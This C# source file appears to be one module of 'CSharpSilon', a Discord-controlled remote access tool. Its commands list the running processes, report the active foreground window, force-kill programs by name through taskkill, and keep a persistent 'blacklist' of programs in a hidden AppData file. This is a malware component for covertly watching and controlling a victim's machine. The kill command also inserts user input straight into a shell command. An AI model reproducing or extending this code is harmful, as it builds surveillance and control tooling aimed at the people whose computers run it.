using System;
using System.Collections.Generic;
using Discord.Commands;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using CSharpSilon.Utils;

namespace CSharpSilon.cmds
{
    public class Processes : ModuleBase<SocketCommandContext>
    {
        
        public static readonly string BlacklistFilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "cs", "dp.csln");
        public static readonly HashSet<string> BlacklistedPrograms = new HashSet<string>(LoadBlacklistedPrograms());


        [Command("show"), Summary("Shows All Current Running Processes")]
        public async Task Show()
        {
            var processesList = Process.GetProcesses().Select(p => p.ProcessName).ToList();
            processesList.Sort();
            var processGroups = processesList.GroupBy(p => p).Select(g => $"{g.Key} [x{g.Count()}]").ToList();
            var totalProcesses = processesList.Count;

            var processes = string.Join("\n", processGroups.Select((proc, index) => $"> {proc}"));
            string msg =
                $"Processes at {DateTime.Now}\n{processes}\n```Total processes: {totalProcesses}```\n```If you want to kill a process, type {Config.Prefix}kill <process-name>```";

            await SendMessageInChunksAsync(msg);
        }



        [Command("foreground"), Summary("Gets The Current Foreground Window")]
        public async Task Foreground()
        {
            await Context.Message.DeleteAsync();

            var foregroundWindow = GetForegroundWindow();
            uint processId = 0;
            GetWindowThreadProcessId(foregroundWindow, out processId);
            var processName = Process.GetProcessById((int)processId)?.ProcessName;

            if (processName == null)
            {
                await ReplyAsync("```Failed to get foreground window process name.```");
            }
            else
            {
                var msg = $"```{processName}```\n```You can kill it with -> {Config.Prefix}kill {processName}```";
                ReplyAsync(msg);

            }
        }

        [Command("kill"), Summary("Kill A Process Based Off Of It's Process Name")]
        public async Task Kill([Remainder] string processName)
        {
            var procs = Process.GetProcessesByName(processName);
            if (procs.Length >= 1)
            {
                if (!processName.EndsWith(".exe")) processName += ".exe";
                Utils.App.execute($"taskkill /f /im {processName}");
                await Task.Delay(500);

                if (!Process.GetProcessesByName(processName).Any())
                {

                    await ReplyAsync($"```Successfully killed {processName}```");
                }
                else
                {

                    await ReplyAsync($"```Tried to kill {processName} but it's still running...```");
                }
            }
            else
            {

                await ReplyAsync($"```Could not find process by name: {processName}```");
            }


        }

        [Command("Blacklist"), Summary("Adds A Process To The Blacklisted Programs")]
        [Alias("bl", "blist")]
        public async Task Blacklist(string processName = "")
        {
            if (processName.Length == 0)
            {
                var programs = string.Join("\n ", BlacklistedPrograms);
                await ReplyAsync($"Blacklisted programs: ```{programs}```");
            }
            else
            {
                if (!BlacklistedPrograms.Contains(processName.ToLower()))
                {
                    BlacklistedPrograms.Add(processName.ToLower());
                    SaveBlacklistedPrograms();
                    await ReplyAsync($"```Added: {processName} To The Blacklist.```");
                }
                else
                {
                    await ReplyAsync($"```{processName} Is Already Blacklisted.```");
                }
            }
        }
        
        public static void SaveBlacklistedPrograms()
        {
            File.WriteAllLines(BlacklistFilePath, BlacklistedPrograms);
        }

        public static IEnumerable<string> LoadBlacklistedPrograms()
        {
            if (File.Exists(BlacklistFilePath))
            {
                return File.ReadAllLines(BlacklistFilePath);
            }
            return Enumerable.Empty<string>();
        }


        
        
        [Command("Whitelist"), Summary("Removes A Process From The Blacklisted Programs.")]
        [Alias("wl", "wlist")]
        public async Task Whitelist([Remainder] string processName)
        {
            if (BlacklistedPrograms.Remove(processName.ToLower()))
            {
                SaveBlacklistedPrograms();
                await ReplyAsync($"```{processName} Has Been Whitelisted.```");
            }
            else
            {
                await ReplyAsync($"```{processName} Is Not Blacklisted.```");
            }
        }







        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        private async Task SendMessageInChunksAsync(string message)
        {
            const int MaxMessageLength = 2000;

            if (message.Length <= MaxMessageLength)
            {
                await ReplyAsync(message);
            }
            else
            {
                var chunks = SplitMessage(message, MaxMessageLength);
                foreach (var chunk in chunks)
                {
                    await ReplyAsync(chunk);
                }
            }
        }

        private IEnumerable<string> SplitMessage(string message, int chunkSize)
        {
            for (int i = 0; i < message.Length; i += chunkSize)
            {
                yield return message.Substring(i, Math.Min(chunkSize, message.Length - i));
            }
        }

    }
}